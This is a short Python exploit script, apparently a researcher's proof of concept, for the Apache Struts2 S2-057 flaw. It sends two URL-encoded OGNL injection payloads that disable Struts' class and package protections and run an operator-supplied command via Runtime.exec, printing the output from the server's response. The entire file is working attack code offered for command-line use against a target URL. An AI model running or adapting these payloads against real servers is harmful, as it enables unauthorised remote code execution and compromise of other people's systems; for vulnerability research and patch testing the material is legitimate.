#coding: utf-8 
#author: 360云影实验室 (icematcha@360Yunyinglab, Ivan1ee@github.com)
from __future__ import print_function

import requests
import sys

def expliot(host, command, path):
	payload = '%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27'+ command +'%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/'
	payload1 = '%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27'+command+'%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/'

	url = host+payload+path
	url1 = host+payload1+path

	res = requests.get(url, allow_redirects=False)
	res1 = requests.get(url1, allow_redirects=False)

	if res.status_code == 200 and res1.status_code != 200:
		print("Exploit successful:")
		print(res.content)
	elif res1.status_code == 200 and res.status_code != 200:
		print("Exploit successful:")
		print(res1.content)
	else:
		print('The target is likely unvulnerable,mabye your struts2 version is too high!')


if __name__ == '__main__':
	if len(sys.argv) < 4:
		print("Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}")
	else:
		expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())
